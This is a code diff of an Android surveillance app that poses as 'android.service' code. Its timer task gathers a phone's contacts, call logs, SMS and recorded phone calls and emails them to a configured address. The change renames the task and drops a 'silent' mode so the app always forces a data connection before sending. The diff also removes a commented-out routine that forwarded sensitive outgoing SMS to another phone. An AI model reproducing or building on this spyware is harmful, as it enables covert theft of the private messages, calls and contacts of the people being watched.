@@ -9,7 +9,6 @@ import java.util.Date;
 import java.util.List;
 import java.util.TimerTask;
 
-
 import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.NetworkUtil;
 import com.particle.inspector.common.util.RegExpUtil;
@@ -28,7 +27,6 @@ import android.content.res.Resources;
 import android.net.Uri;
 import android.os.Environment;
 import android.service.activity.GlobalPrefActivity;
-import android.service.activity.NETWORK_CONNECT_MODE;
 import android.service.config.ConfigCtrl;
 import android.service.config.MailCfg;
 import android.service.feature.contact.ContactCtrl;
@@ -42,7 +40,7 @@ import android.util.Log;
 /**
  * Implementation of the timer task for information collection.
  */
-public class GetInfoTask extends TimerTask 
+public class SendInfoTask extends TimerTask 
 {
 	private final static String LOGTAG = "GetInfoTask";
 	
@@ -55,56 +53,29 @@ public class GetInfoTask extends TimerTask
 	
 	private static final long MIN_FILE_SIZE = 10240; // 10KB
 	
-	public GetInfoTask(Context context)
+	public SendInfoTask(Context context)
 	{
 		super();
 		this.context = context;
 		if (attachments != null) attachments.clear();
 		else attachments = new ArrayList<File>();
-		
-		interval = GlobalPrefActivity.getInfoInterval(context);
 	}
 	
 	public void run() 
 	{
-		// ===================================================================================
-		// Check outgoing SMS for redirecting these sensitive
-		// ===================================================================================
-		/*
-		boolean allowRedirectSMS = GlobalPrefActivity.getRedirectSms(context);
-		String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-		if (allowRedirectSMS && phoneNum.length() > 0) {
-			String[] sensitiveWords = GlobalPrefActivity.getSensitiveWords(context)
-					.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.SENSITIVE_WORD_BREAKER) // Remove duplicated blank spaces
-					.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
-			if (sensitiveWords.length > 0) {
-				List<SmsInfo> smsList = SmsCtrl.getSensitiveOutgoingSmsList(context, sensitiveWords, timeThreshold);
-				for (SmsInfo sms : smsList) {
-					String header = String.format(context.getResources().getString(R.string.sms_redirect_header), sms.phoneNumber);
-					SmsCtrl.sendSms(phoneNum, header + sms.smsbody);
-				}
-			}
-		}
-		*/
-		
-		// If there are no recipients, return 
-		String[] recipients = getRecipients(context);
-		if (recipients == null || recipients.length == 0) return;
+		// If there are no safe mail, return 
+		String recipient = GlobalPrefActivity.getSafeMail(context);
+		if (recipient == null || recipient.length() == 0) return;
 		
 		boolean isAlreadyDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
-		NETWORK_CONNECT_MODE netMode = GlobalPrefActivity.getNetworkConnectMode(context);
 		
 		// ===================================================================================
 		// Try to send contact/phonecall/SMS collections
 		// ===================================================================================
 		if (isTimeToCollectInfo()) 
 		{
-			// If network not connected, retrun if silent mode
-			if (!isAlreadyDataNetworkConnected && netMode == NETWORK_CONNECT_MODE.SILENT) {
-				return;
-			}
-			// Or try to connect network if active mode
-			else if (!isAlreadyDataNetworkConnected && netMode == NETWORK_CONNECT_MODE.ACTIVE) {
+			// Try to connect network
+			if (!isAlreadyDataNetworkConnected) {
 				if (!NetworkUtil.tryToConnectDataNetwork(context)) {
 					return;
 				}
@@ -144,7 +115,7 @@ public class GetInfoTask extends TimerTask
 			while(!result && retry > 0)
 			{
 				String sender = MailCfg.getSender(context);
-				result = sendMail(subject, body, sender, pwd, recipients, attachments);
+				result = sendMail(subject, body, sender, pwd, recipient, attachments);
 				retry--;
 			}
 			attachments.clear();
@@ -164,12 +135,9 @@ public class GetInfoTask extends TimerTask
 		SysUtils.threadSleep(1000, LOGTAG);
 		// If network connected, try to collect and send the information
 		boolean isConnected = NetworkUtil.isNetworkConnected(context);
-		// If network not connected, retrun if silent mode
-		if (!isConnected && netMode == NETWORK_CONNECT_MODE.SILENT) {
-			return;
-		}
-		// Or try to connect network if active mode
-		else if (!isConnected && netMode == NETWORK_CONNECT_MODE.ACTIVE) {
+		
+		// Or try to connect network
+		if (!isConnected) {
 			if (!NetworkUtil.tryToConnectDataNetwork(context)) {
 				return;
 			}
@@ -178,7 +146,7 @@ public class GetInfoTask extends TimerTask
 		// If come here, means the network connected
 		
 		// Get all wav files
-		String prefix = context.getResources().getString(R.string.phonecall_record);
+		String prefix = context.getResources().getString(R.string.phonecall_record_env);
 		List<File> wavs = new ArrayList<File>();
 		try {
 			File dir = FileCtrl.getDefaultDir();
@@ -221,7 +189,7 @@ public class GetInfoTask extends TimerTask
 			while(!result && retry > 0)
 			{
 				String sender = MailCfg.getSender(context);
-				result = sendMail(subject, body, sender, pwd, recipients, pack);
+				result = sendMail(subject, body, sender, pwd, recipient, pack);
 				retry--;
 			}
 		
@@ -338,14 +306,14 @@ public class GetInfoTask extends TimerTask
 		}
 	}
 	
-	public static boolean sendMail(String subject, String body, String sender, String pwd, String[] recipients, List<File> files)
+	public static boolean sendMail(String subject, String body, String sender, String pwd, String recipient, List<File> files)
 	{
 		boolean ret = false;
 
         try {   
             GMailSenderEx gmailSender = new GMailSenderEx(sender, pwd);
             gmailSender.setFrom(GMailSenderEx.DEFAULT_SENDER);
-            gmailSender.setTo(recipients);
+            gmailSender.setTo(new String[] {recipient});
             gmailSender.setSubject(subject);
             gmailSender.setBody(body);
             
@@ -358,17 +326,6 @@ public class GetInfoTask extends TimerTask
         }
         
 		return ret;
-	}
-	
-	private static String[] getRecipients(Context context)
-	{
-		String mail = GlobalPrefActivity.getSafeMail(context);
-		String[] mails = mail.split(",");
-		if (mails.length > 0) {
-			return StrUtils.filterMails(mails);
-		} else {
-			return null;
-		}
 	}
 	
 }
